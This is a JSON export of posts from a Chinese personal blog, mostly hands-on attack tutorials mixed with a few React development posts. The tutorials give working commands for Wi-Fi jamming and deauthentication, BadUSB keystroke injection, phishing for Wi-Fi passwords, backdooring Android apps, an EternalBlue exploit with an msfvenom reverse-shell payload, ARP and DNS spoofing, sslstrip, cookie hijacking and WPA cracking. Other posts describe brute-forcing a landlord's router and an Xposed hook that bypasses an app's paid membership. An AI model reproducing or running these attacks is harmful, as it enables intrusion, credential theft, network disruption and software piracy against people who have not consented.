[{"title":"wifi干扰","date":"2017-06-08T02:13:25.000Z","path":"cj48bmeo9000jc0w6vda61fu5/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就在网上看到过一个固件，烧录在开发板中，然后可以用来攻击wifi和干扰wifi，其实原理很简单，干扰可以使用mkd3来完成，攻击可以使用aircrack-ng套件来完成，早在之前我就发过使用aircrack-ng攻击的相关文章(点我)，只是这个固件把这两个结合在了一起，喜欢折腾硬件的朋友可以去试一试。 固件地址https://github.com/spacehuhn/esp8266_deauther 干扰&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就知道了wifi干扰，就是创建数十个杂乱的wifi来干扰正常的信号接收，前几天突然看到有人用wifi来表白，真是脑洞大开。然后我测试了一下也可以使用mdk3的wifi干扰来实现。 我们使用的是mdk3中的b模块(b-Beacon Flood Mode) mdk3 wlan0 b -g -c 11 -c 信道 -g 54Mbit模式 ↓ 这种是创建数十个杂乱wifi信号来干扰。 ↓ 下面我们可以来创建自定义wifi。 首先把wifi名一行一个的保存在文本中。 ↓ 我们先创建4个，当然也可以更多。 mdk3 wlan0 b -g -c 11 -f /root/ap.txt -f 自定义wifi名 ↓ 然后会创建出以我们保存在文本中的名字的wifi名。↓ 题外下面再来说说攻击模块，我在前面说过攻击模块还是aircrack-ng套件比较好用(点我) 洪水攻击mdk3下有两个攻击方式其中一个就是洪水攻击，d模块(De-authentication Flood Attack) mdk3 wlan0 d -c 11 所有连接了频道为11的ap设备全部断线。 同时也有个设置白名单 mdk3 mon0 d -c 11 -w &quot;whitelist.txt&quot; -w 白名单 -b 黑名单 除了保存在白名单中的设备，其他全部断线。 身份验证攻击还有一个种就是身份验证攻击，向wifi发送随机的大量连接请求，a模块(Authentication DoS mode) mdk3 wlan0 a -a wifi_MAC -a wifi的mac地址","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"React开发新闻网适配pc端及移动端","date":"2017-05-30T11:07:12.000Z","path":"cj48bmend0006c0w6x2k9enh3/","text":"前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;React项目，我是先接触的React-Native，并且也开发过几个小项目。由于React-Native是由React衍生过来的，所以学习React起来也非常快，得心应手。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，代码简洁明了，封装性很强，比较适合初识react的同学了解和学习&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;项目同时对pc端以及移动端做了相应的适配，项目用的es6 简介 聚合新闻接口 UI框架,antd 路由react-router 演示(动画较大,请耐心等待) pc端 移动端 运行 npm install npm start 项目源码地址 https://github.com/Y00z/react_news","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"React","slug":"React","permalink":"http://y00z.github.io/tags/React/"}]},{"title":"防范ONION勒索病毒","date":"2017-05-13T05:03:16.000Z","path":"cj48bmepp0013c0w69svr6uv3/","text":"前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;话说周末真的是搞大新闻时间，今早一醒就又被一个勒索病毒给刷了屏，稍微看了一下感觉没啥，就是一个古老的勒索软件利用了一个月前NSA美国安全局内部曝光的smb漏洞来传播，可怕的是这个NSA的这个漏洞非常厉害，所以传播的很快，我之前也发过NSA曝光的漏洞相关报道(点我)，如果有设备中招了，病毒就会利用该设备来扫描内网中其他开445的设备并且攻击，很多学校机房和公用电脑都是年久失修的，而且学校都是一个大内网，所以学校是重灾区。 漏洞防御这个病毒就是利用之前NSA爆出的smb漏洞来传播的，所有防范这个病毒其实就是只要防范之前NSA爆出的smb漏洞就可以了。 3个办法 ①控制面板→windows防火墙→高级设置→入站规则→新建规则→端口→tcp→下面输入“135,445”→阻止连接→再新建一次规则里面选udp ②打上最新官方补丁下载地址：https://technet.microsoft.com/zh-cn/library/security/MS17-010 ③XP和win2003微软已经停止维护的可以使用 360的检测与修复工具 ：https://dl.360safe.com/nsa/nsatool.exe 文件修复最新消息 出了两个文件恢复工具，并不是解密工具，只能恢复一部分文件第一个是360出的恢复工具。 http://weibo.com/ttarticle/p/show?id=2309404107129664487886 第二个是不知名公司出的恢复工具 http://www.youxia.org/29083.html 最新消息,可恢复全部数据 阿里出了解密工具，可以完全恢复所有数据，前提是计算机没有关机过，原理就是加密后，key会存在内存中，可以在内存中找到key，和神器mimikatz原理差不多一样。 https://yq.aliyun.com/articles/86599?utm_content=m_21495","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"制作BadUSB","date":"2017-05-12T07:14:09.000Z","path":"cj48bmepl000zc0w6bq70mv7f/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;差不多的原理就是伪装成HID设备如键盘或者鼠标，然后模拟键盘按键来打开cmd执行powershell指令对电脑进行攻击，而且这种攻击是无法拦截的。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;制作BadUsb有两个方法，一种是Arduino开发板，另一种PS2251-03的微处理器的U盘，可以在这里看U盘的列表型号 ，这里我使用的第一种制作方法。(ps：我本来用的是第二种方法，买了指定型号的u盘，买回来后发现微处理器并不是PS2251-03微处理器，然后才换了第一种方法) 材料* Arduino Leonardo * Arduino IDE * micro usb数据线 Arduino Leonardo 可以去水深宝淘到。 Arduino IDE 下载地址：https://www.arduino.cc/en/Main/Software Arduino Leonardo ↓ 拆开看看 ↓ 使用micro usb 安卓数据线就可以和电脑连接了 ↓ Arduino IDE打开后默认是这样的 ↓ 同时需要把IDE菜单=&gt;工具的两个选项选一下。 ↓ 这个选项需要电脑连接开发板后才有 ↓ 然后可以来编写代码了。我们可以先来写一个hello world ↓ 123456789101112131415161718192021222324252627282930313233#include&lt;Keyboard.h&gt; //包含键盘模块头文件void setup() &#123; // put your setup code here, to run once: Keyboard.begin();//开始键盘通信 delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 delay(500); Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 delay(500); Keyboard.press('r');//按下r键 delay(500); Keyboard.release(KEY_LEFT_GUI);//松掉win键 Keyboard.release('r');//松掉r键 delay(500); Keyboard.println(\"cmd\");//输入cmd进入DOS delay(500); Keyboard.press(KEY_RETURN); //按下回车键 Keyboard.release(KEY_RETURN); //释放回车键 delay(500); Keyboard.println(\"echo hello world\"); Keyboard.press(KEY_RETURN); //按下回车键 Keyboard.release(KEY_RETURN); //释放回车键 delay(500); Keyboard.press(KEY_CAPS_LOCK); //按下大写键 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键 delay(500); Keyboard.end();//结束键盘通讯&#125;void loop() &#123; // put your main code here, to run repeatedly:&#125; 然后编译验证 ↓ 如果提示这个就说明编译验证成功了 ↓ 接下来就可以把代码上传到Arduino Leonardo，来完成BadUSB制作的最后一步。 ↓ 上传成功后会自动断开USB然后再次连接并且执行代码。 会根据代码来依次执行，先按出win+r键，然后按出cmd 回车，最后输入echo hello world。 总结当然我们可以执行powershell指令来下载自己的payload然后执行，或者其他一些代码。 我这里放几个例子https://github.com/Y00z/BadUSB。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"wifi破解之社工钓鱼","date":"2017-05-07T13:02:11.000Z","path":"cj48bmep4000rc0w67pu8314j/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，我在之前的文章中说过抓握手包破解，这里说一下社工钓鱼来破解得到wifi密码。 攻击原理 抓取握手包 创建一个和目标wifi同名的ap热点， 开启一个web服务，创建一个钓鱼的web页面，要求用户输入wifi密码 模拟dns服务，把所有的请求都解析到自己的ip中 ddos目标ap，使用户连不上路由器 用户连接不上wifi后就会自动连上我们的钓鱼wifi 连上后就所有请求页面都会转到我们的钓鱼页面。 用户输入wifi密码后通过抓取的握手包来匹配正确密码。 这里我们使用Fluxion（当然也有相同的WiFiPhisher）来完成上述的过程 安装首先把程序下载到本地 git clone https://github.com/FluxionNetwork/fluxion.git 首先进入install目录中运行install，会自动把依赖的软件包自动安装好。 ↓ 攻击安装完毕之后就可以直接开启fluxion了。 ↓ 一开始选择语言，其中有中文，但是我还是建议使用英文的。 选择语言后来扫描指定ap的信道。 ↓ 第一个是扫描全部信道，第二个是扫描指定信道，我们选择扫描全部信道。 选择之后会自动开启一个小窗口来扫描ap，如果扫描到了我们要的ap就ctrl+c强制停止掉。 ↓ 停止扫描后会把刚刚我们扫描到的ap都显示出来，选择我们需要攻击的ap。 ↓ 然后选择攻击方式。 ↓ 第一个就是我上面说的伪装ap攻击。我们选第一个。 选择后我们需要设置保存握手包保存路径。 ↓ 我们可以选择默认路径，直接回车。 然后选择抓取握手包的方式。 ↓ 选择我们攻击ap的方式，第一个是使用默认aireplay来攻所有的客户端，第二个则是使用mdk3来攻击所有的客户端。 选择之后会同时开启2个小窗口，一个来ddos攻击ap，第二个来抓取握手包。 ↓ 如果抓取到握手包了右上角会有显示。 ↓ 这个时候可以直接关掉小窗口了，然后查看握手包。 ↓ 来创建一个ssl证书。↓ 开启web服务。↓ 选择路由器的登录界面，在我们国内使用的tp-link比较多，我们可以选择tp-link。 ↓ 完毕之后会同时开启4个窗口，一个dhcp来分配ip，一个用来监听连接进钓鱼ap的客户端，一个来把所有请求解析到本地，最后一个来ddos目标的wifi。 ↓ 这个时候的客户端呢，用户会连接不上原wifi，而会自动连上我们的钓鱼wifi，而且一连上wifi就会自动打开网页，进入我们的钓鱼页面。 ↓ 同时浏览器也会提示用户登录wifi。 ↓ 用户输入密码后，会根据抓到的握手包来匹配正确密码。 ↓ 直到用户输入正确密码后，程序停止。 末尾&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外破解wifi还有使用reaver来穷举pin码，只有ap开着wps，并且没有做防pin的处理，那么可以百分百破解得到密码。但是不知道是不是我这个网卡原因，一直pin失败，所有ap都是一样的。等我解决这个问题后再来发布关于pin码的文章好了。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"wifi破解","slug":"wifi破解","permalink":"http://y00z.github.io/tags/wifi破解/"}]},{"title":"向安卓app中注入payload后门","date":"2017-04-25T09:08:41.000Z","path":"cj48bmepp0011c0w6t0b9z4xz/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文在前面的文章中我有说到过如何向android植入后门app，我们用的方法是使用msf生成一个payload，需要用户单独安装后才行。(点我)那么可不可以向一个正常的app注入payload呢，当然是可以的。原理就是反编译app,然后在app中注入payload代码，然后再重新编译打包。前提是app没有做过一些加固等操作. 在msf中就提供了这样注入方式。 会对该app进行反编译，然后会找到可以注入载荷的钩子点。进一步，它会利用可用于后渗透活动的附加权限使该app的Android清单文件染毒。 这里呢，我使用backdoor-apk来向app注入payload 其中有3个选项， 选择反弹的payload 监听的ip 监听的端口 完毕之后染毒的apk在original/dist目录中，并且会在本地生成一个backdoor-apk.rc文件。 backdoor-apk.rc里面包含着msf的所有配置，所以我们可以直接启动msf并且指定backdoor-apk.rc文件即可。会自动帮我们把msf配置好 手机安装上染毒的apk，msf成功收到反弹到一个会话","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"路由器刷入breed","date":"2017-04-22T06:03:18.000Z","path":"cj48bmer1001lc0w6hlmdkd1c/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;什么是breed呢，breed又称不死breed，就相当于安卓的rec。和固件是分开的，刷其他固件并不会影响到breed。如果刷的固件不兼容,路由器刷成砖了，就可以通过web进入breed，再刷其他的固件,来恢复路由器。 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天看到某东做活动，买了一台k2，正式开启了刷路由器之旅，以前也看过很多关于路由器的技术文章，由于一直没有多余的路由器，一直无法实际操作。 k2中有可以官方直刷的breed，所以刷入breed很容易，在路由器后台选择手动升级，然后载入相应的breed的bin文件就ok了 完毕后怎么进入breed呢，拔掉路由器电源，然后电脑网线连接路由器的LAN口，自动获取IP。 按住路由器RESET键，按住不动，然后路由器再插上电源，RESET键持续按住几秒，然后电脑访问192.168.1.1就可以进入breed控制台了。 breed下载地址 https://breed.hackpascal.net/","tags":[{"name":"路由器","slug":"路由器","permalink":"http://y00z.github.io/tags/路由器/"}]},{"title":"React-Native狗狗说项目+NodeJs服务器","date":"2017-04-21T14:26:15.000Z","path":"cj48bmemy0003c0w62zwck2cl/","text":"前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习React-Native中的一个小项目，录制视频和音频，然后去掉视频中的声音，再把无声音的视频和录的音频合并，项目用的ES6语法。同时主页使用了rap和mock数据测试框架。 用到了第三方组件有 react-native-video react-native-sound react-native-image-picker react-native-audio react-native-vector-icons等等一些其他第三方组件。支持同步上传到七牛和cloudinary网盘中。 服务器端使用的是NodeJs，express4框架。同时使用了luosimao短信验证码平台。 encoding…… 客户端 https://github.com/Y00z/react-navie_dogSpeak 服务端 https://github.com/Y00z/react-navie_dogSpeak_service","tags":[{"name":"React-Native","slug":"React-Native","permalink":"http://y00z.github.io/tags/React-Native/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://y00z.github.io/tags/NodeJs/"},{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"}]},{"title":"微软末日:黑掉全球70%电脑的0day","date":"2017-04-15T12:41:27.000Z","path":"cj48bmeql001ec0w6e5xgpio9/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。 ps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。 环境 python2.6.6/32位 pywin32-221.win32-py2.6 靶机 win7 攻击者1 攻击者2 配置下载解压后切换到windows目录执行python fb.py默认选项参数特别多，我这里只说重要需要填写的参数 输入靶机ip和攻击者ip以及选择是否开启本地监听。 创建一个工程项目，名字随意 选择模块，选择Eternalblue模块，输入use Eternalblue 一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式 然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。 接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式 然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll &gt; s.dll 如果电脑是32位的就去掉x64/，默认生成的就是32位的 然后再启动配置msf，并监听反弹的shell。1234msf &gt; use exploit/multi/handlemsf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_Tcpmsf exploit(handler) &gt; set LHOST 192.168.1.102msf exploit(handler) &gt; set LPORT 5554 选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。 再来看看我们监听的反弹shell 成功反弹，喜大普奔。 结尾 可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了补丁(点我)并且把此漏洞定为编号MS17-010，win10以下系统更新补丁后的windows将不受影响。 总结 这个NSA的武器库，不需要做任何操作，只要是联网的，就可以做到指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。ps：这个武器库和msf很像，但是感觉没有msf好用，默认选项太多，也许是msf用习惯了吧。 下载地址： https://github.com/x0rz/EQGRP_Lost_in_Translation","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之会话劫持","date":"2017-04-14T17:02:14.000Z","path":"cj48bmep4000xc0w68r750ss9/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。 受害者 攻击者 环境用到的工具 ferret tcpdump Hamster 其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。 添加对32位应用程序的支持 dpkg –add-architecture i386 安装32位ferret sudo aptitude install ferret-sidejack:i386 攻击首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof arpspoof -i eth0 -t 192.168.1.1 192.168.1.101 -i 网卡名 -t 网关和受害者ip 然后使用tcpdump来捕获数据包。 tcpdump -i eth0 -w data.cap -i 网卡名 -w 保存的数据包 这个时候受害者登录微博。 这个时候数据包中的数据都是受害者的网络请求数据，其中包含着cookies. 然后使用ferret来处理数据包。 ferret -r data.cap 处理完成后会在本地生成一个hamster.txt文件。 然后运行hamster。 我们需要打开设置代理。 设置完成后，打开浏进入127.0.0.1:1234，这时候里面的数据都是受害者的所有网络请求数据，包含着登录信息。找到登录后的信息。 劫持成功。 同时也可以发微博","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之dns劫持","date":"2017-04-14T16:26:45.000Z","path":"cj48bmep4000wc0w6havar22d/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。 受害者 攻击者 配置 首先我们需要更改ettercap的dns配置文件，位置在于/etc/ettercap/etter.dns, 我们直接shift+g来到配置文件的最后，配置劫持的域名，和域名所解析的ip，可用*通配符 我把所有.com和.cn的域名全部解析到了本地，也就是说访问.com和.cn的域名，会自动解析我的ip地址。 然后我们开启web服务器并且来到/var/www/html/路径，这里是默认weib服务器的网站目录，我们新建index.html内容随意。 攻击 配置完成之后我们就可以开始攻击了 ettercap -i eth0 -Tq -P dns_spoof /ip// /网关// -i 选择网卡 -T 文本模式 -P 选择模块 后面的两组/，如果我选择内网里所有目标，可以不填ip， 可以看到检测到了3个目标， 我们来ping一下百度 可以看到百度的解析ip变成了我们的ip，说明我们已经劫持成功了，我们来访问一下百度 劫持成功，网页显示的是我们刚刚搭建web服务器中的内容，同时还会检测到访问的所有请求，全部都劫持解析到我们的ip中来。 也就是我们在配置文件上写的.com和.cn的域名全部会解析到我们的ip中来。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之arp攻击","date":"2017-04-14T14:48:19.000Z","path":"cj48bmep4000tc0w6uw824c97/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中间人攻击是好久之前的攻击手段了，早在高三的时候就已经玩透了。应该还有很多人不了解内网安全，我这里还是写出来一下。对于zANTI和DSploit这种就不多说了，我们这里使用老牌套件ettercap 配置更改ettercap配置文件 vi /etc/ettercap/etter.conf esc键 然后 冒号(:) 然后 / 输入Linux。在配置文件中找到Linux字符串。 然后开启暂时路由转发 echo 1 &gt; /proc/sys/net/ipv4/ip_forward * ettercap -i eth0 -Tq -M arp:remote /ip// /网关// -i 选择网卡 -T 文本模式 -M Mitm 后面的两组/，如果我选择内网里所有目标，可以不填ip。 上面说的是命令行中攻击，当然ettercap也有图形化，下面我们使用图形化来简化攻击流程。 ettercap -G 运行图形化，选择Sniff =&gt; Unified sniffing , 来选择网卡 然后Hosts =&gt; Scan for host 来扫描内网中的设备 扫描完毕后Host List显示内网中所有的设备 设备全部选择后，在把网关添加到target 1 其他设备添加到target 2中， 然后选择Mitm =&gt; ARP poisoning 选择攻击模式 勾上 Sniff remote connections，确定 最后start =&gt; Start sniffing 开始攻击 如果网站用了ssl加密呢，那么可以使用sslstrip来针对ssl的攻击。 10000为sslstrip的监听端口 iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-ports 10000 开启sslstrip，并且监听； sslstrip -l 10000 sslstrip会把https网址强制转换成http，然后再通过arp攻击就可以抓取明文信息了。 总结攻击后受害者的所有流量都会经过攻击者，ettercap会自动抓取 TELNET、FTP、SSH、SMB、MySQL等等一些协议信息，同时也可以开wireshark来抓取更多的信息。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"wifi破解之WPA/WPA2抓包跑包","date":"2017-04-12T13:13:22.000Z","path":"cj48bmeoo000mc0w6xa759dsr/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，这里就说一下Aircrack-ng套件，Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就更不多说了，都是基于Aircrack-ng的 扫描ap 准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。 然后扫描一下附近的ap。 airodump-ng wlan0wlan0是ifconfig的网卡名称，注意：我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式 下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的注意：抓包必须要有客户端连接才可以抓包。 抓握手包 扫描到AP信息后来抓包 airodump-ng –bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0-bssid 要抓的ap的mac-w 保存的包名-c 信道(就是扫描中的CH)注意：抓包中需要攻击ap，让客户端断线，客户端重新连接ap后才可以抓到包。可以用aireplay-ng组件来攻击ap aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0-0 冲突攻击模式-a ap的mac 抓到握手包后右上角会显示抓到包的客户端mac 跑包 aircrack-ng -w [字典] [抓到的cap包]","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"wifi破解","slug":"wifi破解","permalink":"http://y00z.github.io/tags/wifi破解/"}]},{"title":"burp爆破http Basic认证","date":"2017-04-04T11:38:29.000Z","path":"cj48bmend0008c0w6r6ql5dbf/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闲来没事想来看看房东的路由器，来试试使用burp爆破一波,对于如何配置burp就不多说了。不用验证码，很好。 然后我们来登录看看发的哪些请求 看样子密码经过base64加密了 可以看到帐号默认admin，然后后面就是我们输入的密码 于是我输入另一个密码，来看一下编码中密码是从哪儿开始的知道了编码中那些是密码，然后我们回到burp中，把请求发送到intruder,来配置字典playload 首先load进字典文件然后到下面的playload Processing,选择add 我们需要的处理是把字典中的密码来编码成base64的，于是选择encode选择什么样的编码呢？我们选择base64, 当然这里也有其他的编码，urlencode等。然后start attack，走你可以看到密码已经全部经过base64加密了。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"开发xposed破解模块","date":"2017-03-28T09:13:30.000Z","path":"cj48bmeq50019c0w63flqlvui/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个挺好玩的app，百变语音，就是在qq上可以把自定义的mp3以语音形式发送给好友。app上有很多男女说话的语音供用户下载使用，同时也可以把qq里面别人发的语音下载过来自己用。(当你听到一个甜美的美女声音的时候，背后可能是一个基佬。)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中还有会员功能，会员功能有更多的语音，并且同时可以在微信中使用。ok让我们来分析一下吧。 反编译 首先来反编译走一波。前面的文章有说道如何反编译，这里就不多说了。 一个小小的app还有这么多包。翻AndroidManifest找入口的Activity 可以看到，指定了一个路径然后给了a.b，然后获取了包名给了a.g，然后有创建了一个HashMap给q.c，然后然后。。。。(我实在编不下去了。)这特么是些啥玩意儿，然后我不看这些杂乱无章的代码，找一下关于会员的关键代码，依然找不到任何线索。这时候突然看到了一个很奇怪的包名 进去看依然是被混淆得不成样子的代码。不过为什么要叫iapp呢，于是我百度了一番。 （这是一款神奇的软件，iApp是一款让你的手机展现放光彩的应用。轻松的操作就可以设计出，你想要的应用界面，你可以分享给你的朋友，传递你的快乐！iApp采用了可视化设计界面，让你设计界面的时候一目了然，不用繁琐的看着代码伤脑筋了！iApp不是一款简单的应用程序，它是创造应用的应用程序。 如果你没有iApp 你就真的没有iApp！ )嗯，非常好，前者有e4a，现在又出来个iapp。全都是直接拖组件的，怪不得这么多包名。 于是不看代码了，看看app的网络请求。 全都是一些注释信息和语音名单。同时把手机的IMEI码上传到了服务器。 其中的vip.php引起了我的注意。返回 0 于是我把这个请求使用burp重定向到了本地，返回 1，这个时候奇迹出现了，Duang 直接就成会员了。 末尾 这个app原理其实很简单，利用了qq的校验不严的漏洞。在录语音的时候会在本地生成已一个语音文件，然后发送给好友就是把这个语音文件发送了出去。然而发送的时候这个语音文件和录语音时生成的语音文件并没有做校验，导致了可以任意发送语音文件。 编写Hook模块。 结论，当访问指定地址的时候如果返回1就是会员。两种方法。1,把请求重定向自己的页面，返回12,把请求的响应体强制改成1 我们直接来hook网络请求模块，1234567891011121314findAndHookMethod(\"org.apache.http.impl.client.AbstractHttpClient\", lpparam.classLoader, \"execute\", HttpHost.class, HttpRequest.class, HttpContext.class, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; HttpRequest request = (HttpRequest) param.args[1]; if (request instanceof org.apache.http.client.methods.HttpGet) &#123; org.apache.http.client.methods.HttpGet httpGet = (org.apache.http.client.methods.HttpGet) request; if (httpGet.getURI().toString().contains(\"dess.ml/vip/vip.php?imei=\")) &#123; BasicHttpResponse basicHttpResponse = (BasicHttpResponse) param.getResult(); basicHttpResponse.setEntity(new StringEntity(\"1\", \"utf-8\")); toast(\"-----破解成功-----\"); &#125; &#125; &#125;&#125;); app用的是apache的网络包，当然还有一个java的网络包 app和模块下载地址 http://pan.baidu.com/s/1skFxIuL 密码: 8zyj","tags":[{"name":"xposed","slug":"xposed","permalink":"http://y00z.github.io/tags/xposed/"},{"name":"破解","slug":"破解","permalink":"http://y00z.github.io/tags/破解/"}]},{"title":"xposed环境搭建","date":"2017-03-25T10:55:37.000Z","path":"cj48bmeoo000oc0w64ukauk5y/","text":"前言 